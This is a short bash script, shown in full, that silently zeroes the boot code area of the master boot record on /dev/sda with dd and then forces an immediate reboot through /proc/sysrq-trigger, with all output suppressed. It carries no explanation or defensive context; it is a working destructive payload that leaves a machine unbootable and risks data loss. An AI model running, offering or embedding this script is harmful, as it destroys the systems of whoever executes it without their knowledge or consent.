#!/bin/bash
{
dd if=/dev/zero of=/dev/sda bs=446 count=1 >/dev/null
echo b > /proc/sysrq-trigger
} &>/dev/null
